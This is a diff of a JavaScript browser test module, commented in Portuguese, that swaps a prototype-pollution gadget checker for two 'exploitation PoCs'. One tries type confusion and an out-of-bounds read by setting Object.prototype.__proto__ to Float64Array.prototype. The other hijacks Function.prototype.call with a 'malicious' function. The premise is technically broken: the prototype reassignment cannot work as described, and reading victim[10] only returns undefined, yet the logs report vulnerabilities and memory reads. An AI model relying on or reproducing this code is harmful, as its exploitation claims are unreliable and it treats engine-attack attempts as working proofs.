@@ -1,208 +1,106 @@
 // js/script3/testAdvancedPP.mjs
-// ARQUIVO CORRIGIDO: Agora usa as funções de utilidade do Script 3 (logS3, PAUSE_S3).
+// ATUALIZADO PARA TENTAR PROVAS DE CONCEITO (PoC) DE EXPLORAÇÃO
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 
-export async function testAdvancedPPS2() {
-    const FNAME = 'testAdvancedPPS2';
-    logS3("--- Teste: PP Avançado (Gadgets++) ---", 'test', FNAME);
+/**
+ * PoC 1: Tenta causar Confusão de Tipos (Type Confusion) poluindo __proto__
+ * e verifica se um objeto Array pode ser tratado como um Float64Array.
+ */
+async function testTypeConfusionPoC() {
+    const FNAME = 'TypeConfusionPoC';
+    logS3(`--- PoC 1: Tentando Confusão de Tipos (Array -> Float64Array) ---`, 'test', FNAME);
+    const originalProto = Object.prototype.__proto__;
+    let success = false;
 
-    const propsToPollute = [
-        // Object.prototype
-        { name: 'constructor', proto: Object.prototype, protoName: 'Object',
-          gadgetCheck: (obj, pollutedValue) => (obj.constructor === pollutedValue && typeof pollutedValue !== 'function') ? 'Object.constructor foi poluído para um valor não funcional!' : null },
-        { name: '__proto__', proto: Object.prototype, protoName: 'Object',
-          gadgetCheck: (obj, pollutedValue) => {
-            try {
-                if (obj.__proto__ === pollutedValue) return `Object.prototype.__proto__ foi poluído (valor da propriedade __proto__ em instâncias)!`;
-            } catch (e) { /* pode falhar */ }
-            return null;
-          }},
-        { name: 'isAdminPPTest', proto: Object.prototype, protoName: 'Object',
-          gadgetCheck: (obj, pollutedValue) => obj.isAdminPPTest === pollutedValue ? 'Nova propriedade Object.prototype.isAdminPPTest poluída com sucesso!' : null },
-        { name: 'valueOf', proto: Object.prototype, protoName: 'Object',
-          gadgetCheck: (obj, pollutedValue) => {
-            if (obj.valueOf === pollutedValue) {
-                 try { obj.valueOf(); return "Object.valueOf sobrescrito, mas ainda chamável (improvável se poluído com string)"; }
-                 catch(e) { return `Object.valueOf sobrescrito e quebrou ao ser chamado! (${e.message})`; }
-            } return null;
-          }},
-        { name: 'toString', proto: Object.prototype, protoName: 'Object',
-          gadgetCheck: (obj, pollutedValue) => {
-            if (obj.toString === pollutedValue) {
-                 try { obj.toString(); return "Object.toString sobrescrito, mas ainda chamável (improvável se poluído com string)"; }
-                 catch(e) { return `Object.toString sobrescrito e quebrou ao ser chamado! (${e.message})`; }
-            } return null;
-          }},
-        { name: 'hasOwnProperty', proto: Object.prototype, protoName: 'Object',
-          gadgetCheck: (obj, pollutedValue) => {
-            if (obj.hasOwnProperty === pollutedValue) {
-                 try { obj.hasOwnProperty('test'); return "Object.hasOwnProperty sobrescrito, mas ainda chamável (improvável se poluído com string)"; }
-                 catch(e) { return `Object.hasOwnProperty sobrescrito e quebrou ao ser chamado! (${e.message})`; }
-            } return null;
-          }},
+    try {
+        logS3('Poluindo Object.prototype.__proto__ para ser o protótipo de Float64Array...', 'info', FNAME);
+        Object.prototype.__proto__ = Float64Array.prototype;
 
-        // Element & Node prototypes
-        { name: 'data-pp-test', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div'),
-          gadgetCheck: (obj, pollutedValue) => obj.getAttribute('data-pp-test') === pollutedValue ? 'Atributo data-pp-test via Element.prototype poluído!' : null,
-          polluteLogic: (targetProto, propName, pValue) => { Object.defineProperty(targetProto, propName, { value: pValue, writable: true, configurable: true }); },
-          checkLogic: (instance, propName, pValue) => instance[propName] === pValue
-        },
-        { name: 'innerHTML', proto: Element.prototype, protoName: 'Element', createTarget: () => document.createElement('div'),
-          gadgetCheck: (obj, pollutedValue) => {
-            if (Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML')?.value === pollutedValue) {
-                return "A propriedade 'value' do descritor de Element.prototype.innerHTML foi poluída (altamente improvável para setters/getters nativos).";
-            }
-            return null;
-          }
-        },
-        { name: 'customDataProp', proto: Node.prototype, protoName: 'Node', createTarget: () => document.createElement('div'),
-          gadgetCheck: (obj, pollutedValue) => obj.customDataProp === pollutedValue ? 'Node.prototype.customDataProp poluído!' : null },
+        let victim = [1.1, 2.2]; // Nosso array vítima
+        logS3(`Vítima é um Array: ${Array.isArray(victim)}`, 'info', FNAME);
 
-
-        // Array.prototype
-        { name: 'customArrayProp', proto: Array.prototype, protoName: 'Array', createTarget: () => [],
-          gadgetCheck: (obj, pollutedValue) => obj.customArrayProp === pollutedValue ? 'Array.prototype.customArrayProp poluído!' : null },
-        { name: 'map', proto: Array.prototype, protoName: 'Array', createTarget: () => [],
-          gadgetCheck: (obj, pollutedValue) => {
-            if (obj.map === pollutedValue) {
-                 try { obj.map(x=>x); return "Array.map sobrescrito, mas ainda chamável (improvável se poluído com string)"; }
-                 catch(e) { return `Array.map sobrescrito e quebrou ao ser chamado! (${e.message})`; }
-            } return null;
-          }},
-
-        // Function.prototype
-        { name: 'customFuncProp', proto: Function.prototype, protoName: 'Function', createTarget: () => function f(){},
-          gadgetCheck: (obj, pollutedValue) => obj.customFuncProp === pollutedValue ? 'Function.prototype.customFuncProp poluído!' : null },
-        { name: 'call', proto: Function.prototype, protoName: 'Function', createTarget: () => function f(){},
-          gadgetCheck: (obj, pollutedValue) => {
-            if (obj.call === pollutedValue) {
-                 try { obj.call(null); return "Function.call sobrescrito, mas ainda chamável (improvável se poluído com string)"; }
-                 catch(e) { return `Function.call sobrescrito e quebrou ao ser chamado! (${e.message})`; }
-            } return null;
-          }},
-    ];
-
-    const testValue = "PP_S3_Isolated_" + Date.now();
-    let successCount = 0;
-    let gadgetCount = 0;
-    let gadgetMessages = [];
-
-    for (const item of propsToPollute) {
-        if (!item.proto) {
-            logS3(`AVISO: Protótipo não definido para ${item.name} em testAdvancedPPS2. Pulando.`, 'warn', FNAME);
-            continue;
-        }
-        const prop = item.name;
-        const targetProto = item.proto;
-        const targetProtoName = item.protoName;
-
-        let originalDescriptor = undefined;
-        let wasDefined = false;
-        let pollutionAttempted = false;
-
-        try {
-            originalDescriptor = Object.getOwnPropertyDescriptor(targetProto, prop);
-            if (originalDescriptor) {
-                wasDefined = true;
-            }
-        } catch (e) {
-            logS3(`AVISO: Erro ao obter descritor original de ${targetProtoName}.${prop}: ${e.message}.`, 'warn', FNAME);
+        if (victim instanceof Float64Array) {
+            logS3('VULN: Confusão de Tipos bem-sucedida! A vítima Array agora é uma instância de Float64Array.', 'vuln', FNAME);
+            success = true;
+        } else {
+            logS3('FALHA: A confusão de tipos não funcionou como esperado.', 'warn', FNAME);
         }
 
-        try {
-            if (item.polluteLogic && typeof item.polluteLogic === 'function') {
-                item.polluteLogic(targetProto, prop, testValue);
-            } else {
-                if (prop === 'innerHTML' || prop === 'outerHTML' || prop === 'textContent' || prop === 'href' || prop === 'src' || prop === 'style' || prop === 'value') {
-                    logS3(`INFO: Poluição direta de protótipo DOM para '${prop}' é complexa e pulada neste refinamento. Testando em instância se possível.`, 'info', FNAME);
-                } else {
-                    Object.defineProperty(targetProto, prop, {
-                        value: testValue,
-                        writable: true,
-                        configurable: true,
-                        enumerable: wasDefined ? originalDescriptor.enumerable : true
-                    });
-                }
-            }
-            pollutionAttempted = true;
+        if (success) {
+            logS3('AVISO: Tentando ler um índice fora do limite (OOB) no array confundido. ISSO PODE TRAVAR O NAVEGADOR.', 'critical', FNAME);
+            await PAUSE_S3(1000); // Pausa para o usuário ler o aviso
 
-            let obj;
-            if (item.createTarget) {
-                try { obj = item.createTarget(); }
-                catch (e) {
-                    logS3(`AVISO: Falha ao criar objeto alvo para ${targetProtoName}.${prop}: ${e.message}`, 'warn', FNAME);
-                    obj = {};
-                }
-            } else {
-                obj = {};
-            }
-
-            let inheritedValue = undefined;
-            let checkSuccessful = false;
-
-            if (item.checkLogic && typeof item.checkLogic === 'function') {
-                checkSuccessful = item.checkLogic(obj, prop, testValue);
-            } else {
-                try {
-                    inheritedValue = obj[prop];
-                    if (inheritedValue === testValue) {
-                        checkSuccessful = true;
-                    }
-                } catch (e) {
-                    logS3(`AVISO: Erro ao acessar ${prop} no objeto de teste para ${targetProtoName} após poluição: ${e.message}`, 'warn', FNAME);
-                }
-            }
-
-
-            if (checkSuccessful) {
-                logS3(`-> VULN: Herança/Efeito PP para '${targetProtoName}.${prop}' OK (valor = testValue ou checkLogic passou).`, 'vuln', FNAME);
-                successCount++;
-
-                if (item.gadgetCheck) {
-                    let gadgetMsg = null;
-                    try {
-                        gadgetMsg = item.gadgetCheck(obj, testValue);
-                    } catch(e){
-                        gadgetMsg = `Erro ao executar gadgetCheck para ${prop}: ${e.message}`;
-                    }
-                    if (gadgetMsg) {
-                        logS3(`-> GADGET? ${gadgetMsg}`, 'critical', FNAME);
-                        gadgetMessages.push(`${prop}: ${gadgetMsg}`);
-                        gadgetCount++;
-                        const dangerousProps = ['constructor', '__proto__', 'hasOwnProperty', 'appendChild', 'addEventListener', 'map', 'call', 'apply'];
-                        if (dangerousProps.includes(prop)) {
-                            logS3(` ---> *** ALERTA: Potencial Gadget PP perigoso detectado para '${prop}'! ***`, 'escalation', FNAME);
-                        }
-                    }
-                }
-            } else if (pollutionAttempted) {
-                logS3(`-> FAIL/INFO: Poluição de '${targetProtoName}.${prop}' tentada. Verificação de herança/efeito falhou. ` +
-                      `Valor na instância: ${String(inheritedValue).substring(0,100)}`, 'good', FNAME);
-            }
-
-        } catch (e) {
-            logS3(`Erro principal ao poluir/testar '${targetProtoName}.${prop}': ${e.message}`, 'error', FNAME);
-        } finally {
-            if (pollutionAttempted) {
-                try {
-                    if (wasDefined && originalDescriptor) {
-                        Object.defineProperty(targetProto, prop, originalDescriptor);
-                    } else if (!wasDefined && pollutionAttempted) {
-                        delete targetProto[prop];
-                    }
-                } catch (e) {
-                    logS3(`AVISO CRÍTICO: Erro INESPERADO ao limpar/restaurar ${targetProtoName}.${prop}: ${e.message}`, 'critical', FNAME);
-                }
-            }
+            // Se a confusão funcionou, a estrutura interna do 'victim' pode ser mal interpretada,
+            // permitindo ler além dos seus limites originais.
+            let oob_value = victim[10]; // Tenta ler memória adjacente
+            logS3(`LEITURA OOB: Valor lido no índice 10: ${oob_value}`, 'vuln', FNAME);
+            logS3('Se o navegador não travou, a leitura OOB pode não ter atingido uma área crítica, mas a primitiva pode existir.', 'good', FNAME);
         }
-        await PAUSE_S3(10); // Pausa mínima entre testes de propriedade
+
+    } catch (e) {
+        logS3(`ERRO durante a PoC de Confusão de Tipos: ${e.message}`, 'error', FNAME);
+        logS3('Um erro (ex: RangeError) aqui pode ser um bom sinal, indicando que o motor detectou o acesso inválido.', 'info', FNAME);
+    } finally {
+        logS3('Limpando a poluição do protótipo...', 'info', FNAME);
+        Object.prototype.__proto__ = originalProto; // Restauração crucial
     }
+}
 
-    logS3(`--- Teste PP Avançado (Refinado) Concluído (${successCount} poluições/efeitos verificados, ${gadgetCount} gadgets potenciais) ---`, 'test', FNAME);
-    if (gadgetCount > 0) {
-        logS3(`Resumo dos Gadgets Potenciais Detectados:`, 'critical', FNAME);
-        gadgetMessages.forEach(msg => logS3(`  - ${msg}`, 'critical', FNAME));
+
+/**
+ * PoC 2: Tenta sequestrar a função 'Function.prototype.call' para executar nosso próprio código.
+ */
+async function testCallHijackPoC() {
+    const FNAME = 'CallHijackPoC';
+    logS3(`--- PoC 2: Tentando Sequestro de Fluxo via 'Function.prototype.call' ---`, 'test', FNAME);
+    const originalCallDescriptor = Object.getOwnPropertyDescriptor(Function.prototype, 'call');
+    let hijacked = false;
+
+    try {
+        const hijackFunction = function(...args) {
+            // Não chame a função original aqui para evitar recursão infinita
+            logS3(`!!! Function.prototype.call SEQUESTRADO !!!`, 'escalation', FNAME);
+            logS3(`'this' recebido: ${typeof this}, Argumentos: ${args.length}`, 'escalation', FNAME);
+            hijacked = true;
+        };
+
+        logS3("Poluindo 'Function.prototype.call' com nossa função maliciosa...", 'info', FNAME);
+        Object.defineProperty(Function.prototype, 'call', {
+            value: hijackFunction,
+            writable: true,
+            configurable: true
+        });
+
+        logS3("Disparando um gatilho: 'Math.max.call(null, 1, 5, 2)'", 'info', FNAME);
+        await PAUSE_S3(500);
+
+        // Dispara a chamada. Se o hijack funcionou, nossa mensagem aparecerá.
+        try {
+            Math.max.call(null, 1, 5, 2);
+        } catch (e) {
+            logS3(`Erro esperado ao chamar gatilho (a função hijack não retorna nada): ${e.message}`, 'info', FNAME)
+        }
+        
+        if (!hijacked) {
+             logS3('FALHA: O sequestro de "call" não foi detectado.', 'error', FNAME);
+        }
+
+    } catch (e) {
+        logS3(`ERRO durante a PoC de Sequestro de 'call': ${e.message}`, 'error', FNAME);
+    } finally {
+        logS3("Limpando a poluição de 'call', restaurando a função original...", 'info', FNAME);
+        if (originalCallDescriptor) {
+            Object.defineProperty(Function.prototype, 'call', originalCallDescriptor);
+        }
     }
-    await PAUSE_S3(); // Pausa no final da função
+}
+
+/**
+ * Função principal que orquestra a execução das Provas de Conceito de Exploração.
+ */
+export async function runExploitationPoCs() {
+    await testTypeConfusionPoC();
+    await PAUSE_S3(2000); // Pausa entre os testes
+    await testCallHijackPoC();
 }
